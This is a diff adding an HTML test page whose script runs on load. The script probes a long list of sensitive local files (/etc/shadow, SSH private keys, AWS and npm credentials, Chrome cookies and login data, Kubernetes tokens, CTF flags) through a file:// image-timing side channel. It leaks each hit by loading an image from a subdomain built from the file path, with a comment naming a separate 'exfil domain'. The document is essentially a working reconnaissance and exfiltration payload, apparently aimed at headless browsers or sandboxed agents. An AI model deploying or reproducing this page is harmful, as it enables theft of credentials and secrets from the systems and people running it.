@@ -1,0 +1,101 @@
+<html>
+<head><title>test</title>
+<script>
+let host_root = "d0c3a6c04arnnmh5u.xtric.homes"; // your exfil domain
+
+const top_files = [
+  // System identifiers
+  "file:///etc/hostname",
+  "file:///etc/hosts",
+  "file:///etc/passwd",
+  "file:///etc/shadow", // often not readable but worth probing
+  "file:///etc/os-release",
+  "file:///proc/version",
+  "file:///proc/self/environ",
+
+  // Common shell/user config
+  "file:///root/.bashrc",
+  "file:///root/.bash_history",
+  "file:///root/.profile",
+  "file:///root/.ssh/id_rsa",
+  "file:///root/.ssh/known_hosts",
+  "file:///home/node/.bashrc",
+  "file:///home/node/.ssh/id_rsa",
+
+  // Dev credentials & API keys
+  "file:///root/.aws/credentials",
+  "file:///root/.npmrc",
+  "file:///root/.git-credentials",
+  "file:///home/node/.npmrc",
+  "file:///home/node/.git-credentials",
+  "file:///etc/gitconfig",
+
+  // Browser cache/session stuff (if Chromium-based sandbox)
+  "file:///tmp/devtoolsActivePort",
+  "file:///tmp/.X11-unix/X0",
+  "file:///tmp/.com.google.Chrome.*", // Chrome temp dirs
+  "file:///home/chrome/.config/google-chrome/Default/Cookies",
+  "file:///home/chrome/.config/google-chrome/Default/Login Data",
+
+  // Likely container artifacts
+  "file:///home/chrome/.dockerenv",
+  "file:///run/secrets/kubernetes.io/serviceaccount/token",
+  "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
+  "file:///etc/docker/daemon.json",
+  "file:///etc/kubernetes/admin.conf",
+
+  // Misc
+  "file:///var/log/auth.log",
+  "file:///var/log/syslog",
+  "file:///var/log/messages",
+  "file:///tmp/flag.txt",   // CTF-style bait
+  "file:///flag.txt"
+];
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function testFileTiming(path) {
+  return new Promise(resolve => {
+    const start = performance.now();
+    const img = new Image();
+
+    img.onload = img.onerror = () => {
+      const end = performance.now();
+      const duration = end - start;
+      resolve({ path, duration });
+    };
+
+    img.src = path;
+  });
+}
+
+async function scanWithTiming() {
+  for (let file of top_files) {
+    const { path, duration } = await testFileTiming(file);
+
+    // Report if duration exceeds threshold (e.g., 30ms)
+    if (duration > 30) {
+
+const sub = path
+  .replace(/^file:\/\//, '')
+  .replace(/[^a-zA-Z0-9]/g, '-')     // sanitize
+  .replace(/^-+/, '')                // remove leading dashes
+  .replace(/-+$/, '')                // remove trailing dashes
+  .slice(0, 60);                     // truncate to max 60 chars
+
+      const img = new Image();
+      img.src = `http://${sub}-t${Math.round(duration)}.example.com`;
+    }
+
+    await new Promise(r => setTimeout(r, 50));
+  }
+}
+
+scanWithTiming();
+</script>
+</head>
+<body>
+</body>
+</html>
